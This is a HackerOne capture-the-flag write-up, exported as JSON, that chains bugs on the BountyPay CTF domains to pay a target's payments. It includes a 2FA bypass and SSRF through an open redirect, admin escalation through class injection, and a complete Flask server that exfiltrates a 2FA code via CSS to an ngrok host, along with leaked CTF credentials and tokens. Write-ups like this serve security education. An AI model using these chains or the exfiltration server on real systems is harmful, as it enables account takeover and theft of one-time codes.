{"id":894110,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQxMTA=","url":"https://hackerone.com/reports/894110","title":"h1-ctf writeup , finally paid the payments by chaining multiple bugs","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-08T21:35:32.953Z","submitted_at":"2020-06-08T21:35:32.953Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d1r3wolf","url":"/d1r3wolf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:28:49.496Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T02:34:23.584Z","team_member_agreed_on_going_public_at":"2020-06-18T15:28:49.410Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Summary:\nUltimate aim is to pay the payments of hackerone using bounty pay with no use privileges at starting.\nGiven scope is : *.bountypay.h1ctf.com\n\n**Enumerated subdomains are :**\n  1. www.bountypay.h1ctf.com\n  2. app.bountypay.h1ctf.com\n  3. staff.bountypay.h1ctf.com\n  4. api.bountypay.h1ctf.com\n  5. software.bountypay.h1ctf.com (cant access gloabally)\n\nThe overall CTF can be divided into levels, at each level we work with one subdomain.\n**Lets make the road map to the CTF:**\n  1. Login into the **app.bountypay.h1ctf.com** (using **git repo files**, 2FA bypass)\n  2. **SSRF** in **load transactions** to access **software.bountypay.h1ctf.com** and getting **BountyPay.apk**\n  3. Solving the **three challenges** of Android to get **api key** of **api.bountypay.h1ctf.com**\n  4. Recon on the **company twitter** to get the staff_id , finding the creds of **staff.bountypay.h1ctf.com** using that **staff id** and staff details route over **api**\n  5. Getting **hackerone** payment creds by **upgrading to admin** using **report feature** and **chaining the logical bugs** over predifined js \n  6. Leaking the **2FA code** by **CSS exfilteration** and bypass 2FA at payments on **app.bountypay.h1ctf.com**\n  \n# Level - 1 :: \nStarted with app.bountypay.h1ctf.com site.\nThrough dirsearch found the git repo files **/.git/**, downloaded the config file https://app.bountypay.h1ctf.com/.git/config\n```\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = https://github.com/bounty-pay-code/request-logger.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n```\nThrough the config file found the git repo https://github.com/bounty-pay-code/request-logger.git.\nThe repo is php request logger .\nthrough the [logger.php code](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php)\n```php\n\u003c?php\n$data = array(\n  'IP'        =\u003e  $_SERVER[\"REMOTE_ADDR\"],\n  'URI'       =\u003e  $_SERVER[\"REQUEST_URI\"],\n  'METHOD'    =\u003e  $_SERVER[\"REQUEST_METHOD\"],\n  'PARAMS'    =\u003e  array(\n      'GET'   =\u003e  $_GET,\n      'POST'  =\u003e  $_POST\n  )\n);\nfile_put_contents('bp_web_trace.log', date(\"U\").':'.base64_encode(json_encode($data)).\"\\n\",FILE_APPEND   );\n```\n found that it logs the POST and GET variables to the log file **bp_web_trace.log** which is in htdocs and can be accessed through server https://app.bountypay.h1ctf.com/bp_web_trace.log.\n```\n1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==\n1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==\n1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19\n1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==\n```\nBy base64 decoding we can get the first four requests of the server\n```\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":[],\"POST\":[]}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/\",\"METHOD\":\"POST\",\"PARAMS\":{\"GET\":[],\"POST\":{\"username\":\"brian.oliver\",\"password\":\"V7h0inzX\",\"challenge_answer\":\"bD83Jk27dQ\"}}}\n{\"IP\":\"192.168.1.1\",\"URI\":\"\\/statements\",\"METHOD\":\"GET\",\"PARAMS\":{\"GET\":{\"month\":\"04\",\"year\":\"2020\"},\"POST\":[]}}\n```\nUsing that creds we can login into the app.bountypay.h1ctf.com which has an 2FA check.\nThere is no session management, 2FA code is validated using the challenge parameter so 2FA is validated using some relation ship between challenge and challenge_answer.\n```\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\n\nusername=brian.oliver\u0026password=V7h0inzX\u0026challenge=4810310b2c844799dc9c9d46d3838192\u0026challenge_answer=fake\n```\nSeems like the `challenge == md5(challenge_answer)`, tried that one `challenge=144c9defac04969c7bfad8efaa8ea194\u0026challenge_answer=fake`\nWorked : )    -   Successfully logged into app.app.bountypay.h1ctf.com\n\n# Level - 2 ::\nAfter login into the **app.bountypay.h1ctf.com**, it gives a **dashboard** where we can **load transactions based on month, year and pay them**.\nThe brian.oliver is the owner of BountyPayHQ , searched for all months and years, no use, there are no payments for that account.\nBut while loading transactions :\n{F859504}\nIt giving a **url of  api to get the result** and **result data** in the json.\nThe server is **internally requesting the api** for the result. we can achieve **SSRF** if we have control over the url.\nURL : `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=07\u0026year=2020`\nThere is no use of **month and year values** as they are in the **query part**, but after observing the base64 cookie found that the account id **F8gHiqSdpK** has been taken from **token cookie**.\n```\n$ echo eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 | base64 -d\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\nAs we have control over account_id, the injection is in url path, so we can control path over that domain api.bountypay.h1ctf.com only : (.\n\nAfter visiting the [home page](https://api.bountypay.h1ctf.com/) found that there is an redirect at https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API\nurl has an **whitelist check**, but it is accepting https://software.bountypay.h1ctf.com/, which is not accessable globally. \nTried accessing it using ssrf : F859521\nIt has a login page same as app.bountypay.h1ctf.com , tried sending post params in get etc, nothing worked.\nAfter that tried directory brute force using that ssrf, found uploads directory on https://software.bountypay.h1ctf.com/. \n```\u003chtml\u003e\n\u003chead\u003e\u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\u003c/head\u003e\n\u003cbody bgcolor=\"white\"\u003e\n\u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\u003chr\u003e\u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\n\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:26              4043701\n\u003c/pre\u003e\u003chr\u003e\u003c/body\u003e\n\u003c/html\u003e\n```\nFound the apk on the uploads folder, the files has no restrictions for IP. so downloaded it normally https://software.bountypay.h1ctf.com/uploads/BountyPay.apk .  Apk file : F859556\n\n# Level - 3 :: \nDecompiled the Apk into java files\nAnd found that Three challenges in Apk (PartOneActivity.java, PartTwoActivity.java , PartThreeActicity.java).\nFor each activity there is a deep link, the challenges are just fullfill conditions using deeplinks\n```xml\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"three\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"two\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n        \u003cactivity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\"\u003e\n            \u003cintent-filter android:label=\"\"\u003e\n                \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n                \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n                \u003cdata android:scheme=\"one\" android:host=\"part\"/\u003e\n            \u003c/intent-filter\u003e\n        \u003c/activity\u003e\n```\n## First challenge :\n```java\n     if (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n            String firstParam = getIntent().getData().getQueryParameter(\"start\");\n            if (firstParam != null \u0026\u0026 firstParam.equals(\"PartTwoActivity\") \u0026\u0026 settings.contains(str)) {\n```\nIt just checks there is start param in query on deep link and that param value == PartTwoActivity\nSolution : \n```\n$ adb shell am start -d one://part?start=PartTwoActivity\n```\n## Second Challenge \n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n    Uri data = getIntent().getData();\n    String firstParam = data.getQueryParameter(\"two\");\n    String secondParam = data.getQueryParameter(\"switch\");\n    if (firstParam != null \u0026\u0026 firstParam.equals(\"light\") \u0026\u0026 secondParam != null \u0026\u0026 secondParam.equals(\"on\")) {\n```\nIt checks two and switch params must be in query and the values must be `two=light\u0026switch=on`\nSolution : \n```\n$ adb shell am start -d 'two://part?two=light\\\u0026switch=on'\n```\nAfter that there is question where it ask for header value and combine it with `X-` and checks with header value of firebase.\nFrom internal files of firebase in apk found the url for firebase https://bountypay-90f64.firebaseio.com/\nThen getting the header value in it, https://bountypay-90f64.firebaseio.com/header/.json  `Token` is the value, submit it\n\n## Third Challenge\nWhere as PartThreeActivity it checks for `three=base64(PartThreeActivity)` and `switch=base64(on)` and `header=X-Token`\nSolution : \n```\n$ adb shell am start -d 'three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026switch=b24=\\\u0026header=X-Token'\n```\nTo finish this we need google apps in VM, as firebase requires aiuthentication.\nIt saves the Token and Host values to shared preferences.\n```\n$ adb shell\nroot@vbox86p:/ # cat /data/data/bounty.pay/shared_prefs/user_created.xml\n\u003c?xml version='1.0' encoding='utf-8' standalone='yes' ?\u003e\n\u003cmap\u003e\n    \u003cstring name=\"TWITTERHANDLE\"\u003e\u003c/string\u003e\n    \u003cstring name=\"USERNAME\"\u003eHello\u003c/string\u003e\n    \u003cstring name=\"PARTONE\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"TOKEN\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/string\u003e\n    \u003cstring name=\"PARTTWO\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"HOST\"\u003ehttp://api.bountypay.h1ctf.com\u003c/string\u003e\n\u003c/map\u003e\nroot@vbox86p:/ # \n```\nNow we got the token. we can submit it dialogue box that asks after we launch third activity to make it finish F859607.\nFrom the **performPostCall** function of **PartThreeActivity.java** we can get to know how to use the token\n`X-Token: 8e9998ee3137ca9ade8f372739f062c1` as a header for api.bountypay.h1ctf.com\n\n\n# Level - 4 ::\nAfter getting the api token. crawled over the api recursively and only one useful new route `/api/staff`\n```\n_______________________________ Request __________________________________\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nConnection: close\n\n_______________________________ Response __________________________________\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\nAfter few trails over that request , found it resonds to POST method , which takes staff_id as input.\nIf already knows staff_id from GET method is used it is responding as `Staff Member already has an account`\nFor non existing staff_id's `Invalid Staff ID`\n\nThis is most difficult part i faced, didn't expected the recon concept, wasted days over this : (, but i liked it , it is relevant to real life scenario.  \nWe need a new joining staff_id to create an account.\n**Recon part**\nGone to twitter https://twitter.com/BountypayHQ\nThere is a tweet : `Today we welcome Sandra to the team!!!` it is hint for us.\nSearched for following of BountypayHQ in twitter and find sandra twitter account https://twitter.com/SandraA76708114\nThere she posts a tweet of first day job https://twitter.com/SandraA76708114/status/1258693001964068864.\nWhere the photo contains the ID card which has an staff_id on it F859634.\n\n**Staff id**: STF:8FJ3KFISL3\nwith which we can create new account to get staff credentials.\n```\n_______________________________ Request __________________________________\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\n\nstaff_id=STF:8FJ3KFISL3\n_______________________________ Response __________________________________\n {\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\nIt creates a new account and gives the username, password of sandra.\nUsername: sandra.allison\nPassword: s%3D8qB8zEpMnc*xsz7Yp5\n\n# Level - 5 :: \nUsing those **staff creds** we can login to **staff.bountypay.h1ctf.com**\nThrough the js file(https://staff.bountypay.h1ctf.com/js/website.js) we can observer there is upgrade to admin concept\n```js\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), \n$(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), \n$(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), \ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n## Observation-1:\n**upgradeToAdmin** is not working for us, **requires admin privilages**.\nThere is a **report functionality** is dashboard , we might use that to trigger the upgrade functionality on **admin side**.\nThe report to admin request takes only **path of the url**\n```\nGET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV............\n```\nWe have to trigger the upgrade to admin functionality locally only by the url.\n\nObservation-2:\nAs the **avatar** is linked to the **class names** (avatar1, avatar2, avatar2). our **input for avatar** is **simple a class name**.\nSo there is an **class injection in avatar**. It supports **multiple classes** as it allows space char.\nWe can trigger that class injection on `/?template=home` and `/?template=ticket\u0026ticket_id=3582`\n\nObservation - 3:\n**upgrade to  admin** function has been linked to on click listner on **upgradeToAdmin class**\nBased on last line of website.js\n```js\ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\nWe can **trigger onclick** using **hash and class names**, as already we have class names in our control for a div.\nWe can set the **class name** as `tab4 upgradeToAdmin` and **hash** as `#tab4` , which first makes the **div to click** based on **.tab4 class name** \nAs the **div also had upgradeToAdmin class**, now it triggers the upgradetoadmin function .\n\nObservation - 4:\n```js\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n```\nIt is taking the **username** from `input[name=\"username\"]`, we need to find that type of gadget in html.\nafter checking all **templates** , **login template had that gadget**, weirdly there is no check for opening of login template even after loggedin.\nwe need to **fill the username** field with our disired value only with url, tried with get params https://staff.bountypay.h1ctf.com/?template=login\u0026username=nice , Worked : )\n\nObservation - 5:\nBut the **login template** didn't have **class injection**, we need both **login, ticket template** to make this happen.\nAs the template is based on get param, tried giving of multiple templates as array . Worked : )\n\nFinally: \nBy combining all\nChange the avatar value to `tab4 upgradeToAdmin`\n```\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUV....\n\nprofile_name=sandra\u0026profile_avatar=tab4 upgradeToAdmin\n```\nOpen : https://staff.bountypay.h1ctf.com/?template[]=login\u0026username=sandra\u0026template[]=ticket\u0026ticket_id=3582#tab4\nObserver the traffic, it automatically sends the upgrade to admin request . Now time to report it to admin.\n```\n$ echo -n \"/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4\" | base64\nLz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlj\na2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\n```\nVisit the URL : https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ=\n\nIt gives the new admin tab to the dashbaord.\n{F859704}\nWhich contains passwords of bounty pay accounts. now we got the username and password of hackerone's bountypay account.\n```\nUsername: marten.mickos\nPassword : h\u0026H5wy2Lggj*kKn4OD\u0026Ype\n```\n\n# Level - 6 ::\n Now we can login to hackerone's bounty pay account using those creds on **app.bountypay.h1ctf.com**, using 2FA bypass trich , that we did on level -1\nLoad the **transaction of May 2020**, we need to **pay them** in order to **finish the challellege**.\nPayment : https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\nTo pay there is an send challenge option. Which sends code to 2FA app. that request also takes `app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`\nBy changing the value, we can load **our style** for that 2FA code. Now our aim is to leak the **7 digit 2FA** code using **CSS exfilteration**.\n\nAfter some trails with **tag names** using **responsive nature of css** (background image), tried **input** tag. It responded with **7 requests**.\nNow tried to brute force the **input tag's name **. Upto `code_` there comes only **one request**.\nAfter that it responded with **1 to 7 values**. then got to understand the **pattern of input name** like code_1, code_2, code_3, code_4, code_5, code_6, code_7.\nWe need to **leak all those seven codes**. As there is **each input for each code**. it became quite simple for bruteforce.\n## Final payload server using ngrok.\n```python\nfrom flask import *\nfrom flask_cors import CORS, cross_origin\nfrom requests import *\n\napp = Flask(__name__,static_folder='')\ncors = CORS(app)\napp.config['CORS_HEADERS'] = 'Content-Type'\n\n@cross_origin()\n@app.route(\"/css/final.css\")\ndef css_file():\n\treturn app.send_static_file(\"check.css\")\n\nrecord_file=\"/tmp/record_%s.txt\"\n\n@app.route(\"/recieve\")\n@cross_origin()\ndef recieve():\n\tchar = request.args.get('char') ; place = request.args.get('place')\n\tprint(place,' - ',char)\n\treturn \"Done\"\n\ndef set_payload(payload):\n\tfinal = open(\"check.css\",'a+'); string =\"\"\n\tPP = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026'()*+,-./:;\u003c=\u003e?@[]^_`{|}~ \"\n\tfor p in PP:\n\t\tstring += str(payload).replace(\"$$\",p).replace(\"||\",str(ord(p)))\n\tfinal.write(string)\n\tfinal.close()\n\nngrok_url = \"https://87dc2cffc13b.ngrok.io\"\npayload = '''\ninput[name^=\"code_!!\"][value=\"$$\"] {\n\tbackground-image:url(\"%s/recieve?value=||\u0026char=$$\u0026place=!!\");\n}\n'''%ngrok_url\n\nif __name__ == '__main__':\n\twith open(\"check.css\",'w') as F: pass\n\tfor i in range(1,8):\n\t\ttemp = payload.replace('!!',str(i))\n\t\tset_payload(temp)\n\tapp.run()\n```\nJust **intercept** the request of **send_challenge (send 2FA)** and **change the app_style** to https://87dc2cffc13b.ngrok.io/css/final.css.\nFrom **python server log** we can get the **7 digits**, we need to **combine and enter on the site**. we have enough time for this [**2 min**]\n**Boom : )**\n\n# Proof of concept\nHere is the flag : ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\nScreenshot : F859448\n\n## Impact\n\nAccess over payments account.","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":859448,"file_name":"Screenshot_from_2020-06-08_23-04-12.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AyGY62cNRnD7wuECD897WWrJ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-08_23-04-12.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-08_23-04-12.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153912Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7bf2c1865751fc77eea738c45a5673fd68758b953d91895c0a7943cbadaca152","file_size":29131,"type":"image/png"},{"id":859504,"file_name":"Screenshot_from_2020-06-09_00-07-18.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hws3ehRBmJhJHBxZ4rkU6v6s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-07-18.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-07-18.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153912Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b0a9ee830d4db89ccb2554d919296fb230c193a2ebd62c34c7974ebd2c4f8590","file_size":30086,"type":"image/png"},{"id":859521,"file_name":"Screenshot_from_2020-06-09_00-22-24.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iN7hZGUJz8C2otZQdHxiXeFP?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-22-24.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-22-24.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF